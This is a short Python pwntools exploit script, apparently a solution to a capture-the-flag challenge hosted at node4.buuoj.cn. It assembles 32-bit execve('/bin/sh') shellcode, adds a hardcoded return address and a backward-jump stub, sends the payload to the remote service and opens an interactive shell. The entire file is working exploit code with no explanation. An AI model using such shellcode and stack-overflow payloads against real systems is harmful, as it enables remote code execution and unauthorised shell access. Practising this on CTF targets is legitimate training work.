from pwn import *
context(arch='i386', log_level='debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 28012)
elf = ELF('./pwn')

shellcode = 'push 0x68;' \
            'push 0x732f2f2f;' \
            'push 0x6e69622f;' \
            'mov ebx, esp;' \
            'push 0x6873;' \
            'xor ecx, ecx;' \
            'push ecx;' \
            'push 4;' \
            'pop ecx;' \
            'add ecx, esp;' \
            'mov ecx, esp;' \
            'xor edx, edx;' \
            'push SYS_execve;' \
            'pop eax;' \
            'int 0x80;' \

payload = asm(shellcode)
payload += p32(0x8048554)
payload += asm('sub esp, 0x100;')   # 6 bytes
payload += b'\xeb\xD0'  # jmp short ptr -48
print(len(payload))
print(payload)
io.sendline(payload)
io.interactive()